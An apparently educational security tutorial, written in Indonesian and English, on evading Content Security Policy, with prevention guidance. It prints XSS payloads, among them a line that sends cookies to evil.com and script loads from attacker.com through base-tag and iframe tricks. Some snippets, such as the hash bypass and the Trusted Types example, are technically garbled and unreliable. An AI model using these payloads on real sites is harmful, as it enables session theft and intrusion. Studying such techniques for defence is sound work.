# CSP Bypass - Content Security Policy Evasion

## 🎯 Apa Itu Content Security Policy (CSP)?

**Content Security Policy (CSP)** adalah HTTP header yang membantu detect dan mitigate XSS, clickjacking, dan code injection attacks. CSP whitelist sumber yang allowed untuk content seperti scripts, styles, images, dll.

### Mengapa Disebut "Bypass"?
Attackers dapat circumvent CSP restrictions menggunakan creative payloads, misconfigurations, atau exploiting JSONP endpoints, insecure redirects, dan CSP weaknesses.

## 🔬 Cara Kerja CSP

### CSP Header Syntax
```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://trusted.com 'unsafe-inline';
    object-src 'none';
    style-src 'self' 'unsafe-inline' fonts.googleapis.com;
```

### CSP Directives Breakdown

#### Source Types
- `'self'` - Same origin only
- `'unsafe-inline'` - Allow inline JS/CSS (dangerous!)
- `'unsafe-eval'` - Allow eval() function
- `'none'` - Block everything
- `https:` - HTTPS protocol
- `data:` - Data URLs

#### Common Directives
- `default-src` - Fallback untuk unspecified directives
- `script-src` - Valid sources untuk `<script>` tags
- `style-src` - Valid sources untuk CSS
- `object-src` - Valid sources untuk plugins
- `img-src` - Valid sources untuk images
- `frame-src` - Valid sources untuk frames

## 🏗️ Teknologi Di Balik CSP Bypass

### CSP Implementation Browser Engines
- **Chrome/V8:** Strict compliance dengan spec
- **Firefox/SpiderMonkey:** Flexible interpretation
- **Safari/WebKit:** Additional implementation differences
- **CSP 1.0 vs 2.0 vs 3.0:** Evolving security features

### Safe vs Unsafe CSP Configurations

#### Strong CSP (Secure)
```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'strict-dynamic' https://trusted-cdn.com;
    style-src 'self';
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'none'
```

#### Weak CSP (Vulnerable)
```http
Content-Security-Policy:
    default-src 'self' 'unsafe-inline' 'unsafe-eval';
    script-src * data: blob:;
    style-src 'unsafe-inline'
```

## 📊 CSP Bypass Techniques

### JSONP Endpoints Exploitation

#### What is JSONP?
```javascript
// Vulnerable JSONP endpoint
function callback(result) {
    // Process JSON result
}

// Attack via query parameter
http://target.com/jsonp?callback=<script>alert(1)</script>
```

#### CSP Bypass Payload
```html
<script src="http://target.com/jsonp?callback=alert(document.cookie)"></script>
```

### Nonce Reuse Attacks
```http
// CSP with nonce
Content-Security-Policy: script-src 'nonce-abc123'

// Attacker controls nonce via XSS
<script nonce="abc123">
    // Injected code executes
    document.location='http://evil.com?c='+document.cookie;
</script>
```

### Hash Whitelist Bypasses
```http
// CSP allows specific hashes
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-'

<!-- Bypass by injecting risky code with same hash -->
<script>alert(1)</script>
```

### AngularJS Library Exploitation
```javascript
// AngularJS template injection
{{constructor.constructor('alert(1)')()}}

// Template syntax bypasses CSP
```

### Strict Dynamic Misconfigurations
```http
// CSP allows dynamic scripts
Content-Security-Policy: script-src 'strict-dynamic'

<!-- Allows script generation via eval/createElement -->
<script>
    var s = document.createElement('script');
    s.src = 'http://evil.com/evil.js';
    document.head.appendChild(s);
</script>
```

### Base Tag Manipulation
```html
<!-- Base tag changes relative URLs -->
<base href="http://evil.com">

<!-- Now relative scripts load from evil.com -->
<script src="evil.js"></script>
```

### Service Worker Exploitation
```javascript
// Service worker controls cache
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js')
        .then(reg => console.log('Service worker ready'));
}

// Inject malicious service worker
```

## 🛠️ Testing CSP Bypass

### CSP Analysis
```javascript
// Check current CSP
console.log(document.querySelector('meta[http-equiv="Content-Security-Policy"]'));
console.log(document.querySelector('meta[http-equiv="X-WebKit-CSP"]'));

// Test CSP with eval
function testCSP() {
    try {
        eval('alert("Eval works")');
    } catch(e) {
        console.log('Eval blocked:', e);
    }
}
```

### Payload Development
```html
<!-- Test various bypass techniques -->

<!-- 1. JSONP bypass -->
<script src="//example.com/jsonp?callback=document.write('<script>alert(1)</script>')"></script>

<!-- 2. Strict dynamic bypass -->
<script>
    var inject = document.createElement('div');
    inject.innerHTML = '<h1 style="color:red">Injected!</h1>';
    document.body.appendChild(inject);
</script>

<!-- 3. Base tag bypass -->
<base href="http://attacker.com">
<script src="malicious.js"></script>

<!-- 4. iframe bypass -->
<iframe srcdoc="<script src='http://attacker.com/xss.js'></script>"></iframe>
```

### Burp Suite CSP Testing
1. **Evaluator Tab:** Test Policy effectiveness
2. **CSP Auditor:** Check misconfigurations
3. **CSP Bypass Payloads:** Built-in wordlists

### Automated Testing
```bash
# CSP testing tools
csp-evaluator chrome-devtools://
csp-scanner https://example.com

# Manual CSP violation reporting
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violation
```

## 🛡️ Prevention & Mitigation

### Strong CSP Configuration
```http
// Production-ready CSP
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'strict-dynamic' 'nonce-hash';
    style-src 'self' 'nonce-hash';
    img-src 'self' data: https:;
    font-src 'self' fonts.googleapis.com;
    connect-src 'self';
    media-src 'none';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests
```

### CSP Level 3 Implementation
```http
// Advanced directives
Content-Security-Policy:
    require-sri-for script style;  // Subresource Integrity
    trusted-types 'none';          // Trusted Types API
    sandbox;                       // Frames sandboxing
```

### Report Only Mode
```http
// Test CSP without blocking
Content-Security-Policy-Report-Only:
    default-src 'self'; report-uri /csp-reports

// Later enable blocking
Content-Security-Policy: default-src 'self'
```

### Meta Tag Implementation
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### CSP Violation Monitoring
```javascript
// Monitor CSP violations
document.addEventListener('securitypolicyviolation', (e) => {
    console.log('CSP violation:', {
        violatedDirective: e.violatedDirective,
        blockedURI: e.blockedURI,
        sourceFile: e.sourceFile
    });
});
```

## 🔍 Real CSP Bypass Examples

### Twitter Bug Bounty (2015)
- CSP bisa bypassed melalui Twitter Card injection
- Attacker bisa execute arbitrary JavaScript
- Payout: $5,400

### Google's AngularJS Template Injection
```javascript
// AngularJS expression bypass
{{x.__proto__.__proto__.constructor.constructor('alert(1)')()}}

// Template compilation allows code execution despite CSP
```

### Facebook CSP Bypass (2016)
- Bug in CSP implementation allowed script injection
- Affected millions of active sessions
- 90-day disclosure period for fix

## 📈 Advanced CSP Bypass

### Trusted Types Exploitation
```javascript
if (window.TrustedTypes && window.TrustedTypes.createPolicy) {
    const policy = TrustedTypes.createPolicy('bypass', {
        createHTML: s => s.replace(/</g, '<')
    });
    // Bypass logic
}
```

### Service Worker Hooking
```javascript
// Hook fetch requests
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            // Modify response
            return response;
        })
    );
});
```

### Web Worker Exploitation
```javascript
// Web worker CSP limitations
const worker = new Worker('evil.js');
worker.postMessage('bypass CSP');
```

## 🎯 Testing Framework

### Systematic Approach
1. **CSP Discovery:** Check untuk CSP headers/meta tags
2. **Directive Analysis:** Map allowed sources
3. **Bypass Vector Testing:** Try injection points
4. **Reporting:** Document bypass methods found

### CSP Assessment Report
```
# CSP Assessment Report
# Target: https://example.com
# CSP Header Found: script-src 'self' 'unsafe-inline'
# Weaknesses: unsafe-inline allows XSS
# Bypass Vectors: JSONP endpoints, eval injection
# CVSS Score: 7.4 (High)
# Recommendations: Remove 'unsafe-inline', implement nonces
```

## 📚 Resources

- **CSP Reference:** https://content-security-policy.com/
- **CSP Playground:** Test CSP configurations
- **Google CSP Analyzer:** URL-based CSP validation
- **CSP 3.0 Spec:** Latest W3C specifications

---

**CSP penting tapi sering salah konfigurasi.** JSONP bypass dan strict-dynamic exploits common. Master CSP bypass = advanced client-side injection expertise. Strong CSP = effective XSS prevention. 🔒🛡️
